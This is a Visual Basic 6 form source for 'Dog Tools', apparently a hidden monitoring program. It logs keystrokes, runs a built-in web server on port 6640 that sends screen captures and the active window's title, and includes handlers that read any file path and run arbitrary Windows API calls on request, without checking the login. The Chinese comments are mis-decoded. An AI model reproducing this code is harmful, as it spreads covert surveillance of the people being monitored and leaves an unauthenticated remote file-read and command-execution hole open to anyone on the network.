VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form MainWindow 
   BorderStyle     =   0  'None
   Caption         =   "Dog Tools"
   ClientHeight    =   8880
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   13605
   Icon            =   "MainWindow.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   592
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   907
   StartUpPosition =   2  'ÆÁÄ»ÖÐÐÄ
   Begin VB.PictureBox ScreenHost 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BackColor       =   &H80000005&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   465
      Left            =   1650
      ScaleHeight     =   31
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   61
      TabIndex        =   1
      Top             =   600
      Visible         =   0   'False
      Width           =   915
   End
   Begin MSWinsockLib.Winsock Sock 
      Index           =   0
      Left            =   12900
      Top             =   2100
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer FastRunTimer 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   12900
      Top             =   1500
   End
   Begin VB.Timer RunTimer 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   12900
      Top             =   900
   End
   Begin VB.TextBox EditText 
      Appearance      =   0  'Flat
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00919191&
      Height          =   345
      Left            =   2700
      TabIndex        =   0
      Text            =   "123"
      Top             =   1800
      Visible         =   0   'False
      Width           =   6315
   End
   Begin VB.Timer DrawTimer 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   12900
      Top             =   300
   End
End
Attribute VB_Name = "MainWindow"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim oShadow As New aShadow
Dim FirstRun As Boolean

Private Sub DrawTimer_Timer()
    If FirstRun = False Then
        Call OnMinsize
        FirstRun = True
    End If

    If Me.Visible = False Then
        If GetForegroundWindow <> TryWindow.Hwnd Then TryWindow.Hide
        Exit Sub
    End If
    
    ProCore.Display
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Me.Visible = False Then Exit Sub
    
    UpdateClickTest X, Y, 1
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Me.Visible = False Then
        If Button = 2 Then
            Dim p As POINT
            GetCursorPos p
            TryWindow.Show
            TryWindow.Label1.Caption = IIf(Logined, "Opened", "Locked")
            TryWindow.LockButton.Visible = Logined
            TryWindow.Label5.Visible = Logined
            TryWindow.Move p.X * 15, p.Y * 15 - TryWindow.Height - 60
            TryWindow.SetFocus
        End If
        Exit Sub
    End If

    UpdateClickTest X, Y, IIf(Button = 1, 1, 0)
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Me.Visible = False Then Exit Sub

    UpdateClickTest X, Y, 2
End Sub

Private Sub EditText_KeyUp(KeyCode As Integer, Shift As Integer)
    If KeyCode = 13 Then tRet = True
End Sub

Sub OnMinsize()
    mNowShow = "MainPage"
    Me.WindowState = 0
    If Logined Then
        TrayBalloon Me, "You haven't lock your tools , your settings may will be changed by others .", "Dog Tools - Password warning", NIIF_WARNING
    End If
    Me.Hide
End Sub

Private Sub FastRunTimer_Timer()
    BreakerPage.Carry
    MonPage.Carry
End Sub

Private Sub Form_Load()
    Set PublicTextBox = EditText

    With oShadow
        If .Shadow(Me) Then
            .Color = RGB(0, 0, 0)
            .Depth = 10
            .Transparency = 20
        End If
    End With
    
    StartProgram Me, App.Path, True
    
    Call LoadAssets
    
    Password = GetSetting("Dog Tools", "Gen", "Password")
    
    TrayAddIcon Me, "Dog Tools"
    
    DrawTimer.Enabled = True
    FastRunTimer.Enabled = True
    RunTimer.Enabled = True
    
    If App.LogMode <> 0 Then StartKeyboard
    
    WebPath = App.Path & "\web"
    
    Load Sock(1)
    Sock(1).Bind 6640: Sock(1).Listen
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If Logined = False Then
        Call OnMinsize
        Cancel = 1: Exit Sub
    ElseIf Me.Visible = True Then
        If MsgBox("Continue to quit ?", 32 + vbYesNo, "Dog tools") = vbNo Then Cancel = 1: Exit Sub
    End If
    
    Log "Tools", "¹¤¾ßÍË³ö"
    
    If App.LogMode <> 0 Then
        RtlAdjustPrivilege 19, 0, 0, 0     '½µÈ¨·ÀÖ¹À¶ÆÁ
        SetWindowLongA MainWindow.Hwnd, GWL_WNDPROC, WndProc
    End If
    
    If App.LogMode <> 0 Then EndKeyboard
    
    DrawTimer.Enabled = False
    RunTimer.Enabled = False
    FastRunTimer.Enabled = False
    
    Set aShadow = Nothing
    bCancel = True
    
    TrayRemoveIcon
    StartProgram Me, App.Path, False
    
    On Error Resume Next
    Unload TryWindow
End Sub

Private Sub RunTimer_Timer()
    MonPage.Carry2
End Sub

Private Sub Sock_Close(Index As Integer)
    On Error Resume Next

    Sock(Index).close
    Unload Sock(Index)
End Sub

Private Sub Sock_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    On Error Resume Next

    Sock(Index).close
    Sock(Index).Accept requestID
    Load Sock(Sock.ubound + 1)
    Sock(Sock.ubound).Bind 6640
    Sock(Sock.ubound).Listen
End Sub

Private Sub Sock_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error GoTo sth

    Dim data As String, cmd() As String, cmd2() As String, cmd3() As String
    Dim temp() As String
    Sock(Index).GetData data
    cmd = Split(data, vbCrLf)
        
    cmd2 = Split(cmd(0), " ")
    If UCase(cmd2(0)) = "GET" Then
        If Logined = False Then
            If LCase(cmd2(1)) <> "/jump.htm" And LCase(cmd2(1)) Like "*.htm" Then
                SendFile Sock(Index), WebPath & "\Main.htm"
                Exit Sub
            End If
        Else
            If LCase(cmd2(1)) = "/" Or LCase(cmd2(1)) = "/Main.htm" Then
                cmd2(1) = "/Tools.htm"
            End If
        End If
        
        If cmd2(1) = "/" Then
            If Dir(WebPath & "\Main.htm") <> "" Then SendFile Sock(Index), WebPath & "\Main.htm"
        Else
            cmd2(1) = Replace(cmd2(1), "/", "\")
            cmd3 = Split(cmd2(1), "?")
            cmd2(1) = cmd3(0)
            If Dir(WebPath & cmd2(1)) <> "" Then
                Select Case LCase(cmd2(1))
                    Case "\screen.htm"
                        Core.Log "Tools", "´ÓÍøÒ³¶Ë»ñÈ¡ÁËÆÁÄ»½ØÍ¼"
                        ScreenHost.Move 0, 0, Screen.Width / Screen.TwipsPerPixelX, Screen.Height / Screen.TwipsPerPixelY
                        BitBlt ScreenHost.hdc, 0, 0, Screen.Width / Screen.TwipsPerPixelX, Screen.Height / Screen.TwipsPerPixelY, _
                                GetDC(0), 0, 0, vbSrcCopy
                        ScreenHost.Refresh
                        SavePicture ScreenHost.Image, WebPath & "\screen.bmp"
                        SendFile Sock(Index), WebPath & cmd2(1)
                    Case "\logs.htm"
                        Core.Log "Tools", "´ÓÍøÒ³¶Ë´ò¿ªÁË¼àÊÓÕß"
                        Dim Hwnd As Long, Title1 As String * 255, Title2 As String * 255, p As POINT
                        GetCursorPos p
                        Hwnd = GetForegroundWindow
                        GetWindowTextA Hwnd, Title1, 255
                        Hwnd = WindowFromPoint(p.X, p.Y)
                        GetWindowTextA Hwnd, Title2, 255
                        SendFileWithReplace Sock(Index), WebPath & "\Logs.htm", UnSpace(Title1), UnSpace(Title2)
                    Case Else
                        SendFile Sock(Index), WebPath & cmd2(1)
                End Select
            Else
                If Dir(WebPath & "\404.htm") <> "" Then SendFile Sock(Index), WebPath & "\404.htm"
            End If
        End If
    ElseIf UCase(cmd2(0)) = "POST" Then
        cmd3 = Split(data, vbCrLf & vbCrLf)
        cmd3 = Split(cmd3(1), "&")
        If cmd2(1) = "/ExitLogin" Then 'Action
            Core.Log "Tools", "´ÓÍøÒ³¶ËµÇ³ö"
            Logined = False
            SendFileWithReplace Sock(Index), WebPath & "\jump.htm", 5, "\Main.htm", "Sucess", "log-out"
        Else
            If Split(cmd3(0), "=")(0) = "Logcmd" Then
                Dim text As String, text2 As String, test5() As String
                text2 = Split(cmd3(0), "=")(1)
                text2 = URLDecode(text2)
                text2 = Replace(text2, "+", " ")
                test5 = Split(text2, "\")
                Open text2 For Input As #1
                Do While Not EOF(1)
                    Line Input #1, text2
                    text = text & text2 & "<br>"
                Loop
                Close #1
                SendFileWithReplace Sock(Index), WebPath & "\logchecker.htm", test5(UBound(test5)), text
                Exit Sub
            End If
            
            Select Case Split(cmd3(1), "=")(0)  'CmdName
                Case "PassCheck"
                    Dim CheckPass As String, tempPass As String
                    tempPass = Split(cmd3(0), "=")(1)
                    For I = 1 To Len(tempPass)
                        CheckPass = CheckPass & Chr(Asc(Mid(tempPass, I, 1)) - 1)
                    Next
                    If BMEA(CheckPass) = Password Then
                        Core.Log "Tools", "´ÓÍøÒ³¶ËµÇÂ½³É¹¦"
                        Logined = True
                        SendFile Sock(Index), WebPath & "\tools.htm"
                    Else
                        Core.Log "Tools", "´ÓÍøÒ³¶ËµÇÂ½Ê§°Ü"
                        SendFileWithReplace Sock(Index), WebPath & "\jump.htm", 5, "\Main.htm", "Failed to login", "Password Error"
                    End If
                Case "LogList"
                    Dim List As String, Log As String, ret As String, retM As String, paths() As String
                    
                    retM = "<form method=""POST"" action=""Logs"">" & vbCrLf & _
                                "<tr>" & vbCrLf & _
                                "<td width=""24%"">Name</td>" & vbCrLf & _
                                "<td width=""50%"">Path</td>" & vbCrLf & _
                                "<td width=""6%"">" & vbCrLf & _
                                "<button name=""Logcmd"" value=""VPa"" class=""button"" style=""vertical-align:middle""><span>Open</span></button>" & vbCrLf & _
                                "</td>" & vbCrLf & _
                                "</tr>" & vbCrLf & _
                                "</form>"
                    
                    ReDim paths(3)
                    paths(0) = DataPath & "\Logs\Breaker\"
                    paths(1) = DataPath & "\Logs\Keyboard\"
                    paths(2) = DataPath & "\Logs\Monitor\"
                    paths(3) = DataPath & "\Logs\Tools\"
                    
                    For s = 0 To UBound(paths)
                        Log = Dir(paths(s))
                        Do While Log <> ""
                            List = retM
                            List = Replace(List, "Name", Log)
                            List = Replace(List, "Path", Replace(paths(s), DataPath, ""))
                            List = Replace(List, "VPa", paths(s) & Log)
                            ret = ret & List & vbCrLf
                            Log = Dir()
                        Loop
                    Next
                    
                    SendFileWithReplace Sock(Index), WebPath & "\LogList.htm", ret
                Case "ApiCmd"
                    On Error GoTo fuck
                    Dim APICmd() As String, APIStr As String, APIRet As Long
                    Dim Lib As String
                    APIStr = Split(cmd3(0), "=")(1)
                    APIStr = Replace(APIStr, "%28", "(")
                    APIStr = Replace(APIStr, "%23", "#")
                    APIStr = Replace(APIStr, "%2C", ",")
                    APIStr = Replace(APIStr, "%29", ")")
                    Core.Log "Tools", "´ÓÍøÒ³¶ËÖ´ÐÐAPI£º" & APIStr
                    APIStr = Replace(APIStr, "#h", GetForegroundWindow)
                    APICmd = Split(APIStr, ".")
                    Lib = APICmd(0)
                    APICmd(1) = Replace(APICmd(1), "(", " ")
                    APICmd(1) = Replace(APICmd(1), ")", "")
                    APIRet = APIShell.ExecuteAPI(Lib, APICmd(1))
                    If APIRet = 0 Then
                        Err.Raise 4049, , "API shell error : " & APIRet
                    End If
fuck:
                    If Err.Number <> 0 Then
                        SendFileWithReplace Sock(Index), WebPath & "\notify.htm", "\APIShell.htm", "Failed", "Local - " & Err.Number & "<br>" & "  " & Err.Description & "<br>" & "DLL - " & GetLastError
                        Err.Clear
                    Else
                        SendFileWithReplace Sock(Index), WebPath & "\notify.htm", "\APIShell.htm", "Success", "Local - " & Err.Number & "<br>" & "  " & Err.Description & "<br>" & "DLL - " & GetLastError
                    End If
                    
            End Select
        End If
    End If
    
sth:
    If Err.Number <> 0 Then
        If Sock(Index).State = 7 Then SendText Sock(Index), "Error " & Err.Number & "<br>" & Err.Description
        Err.Clear
    End If
End Sub

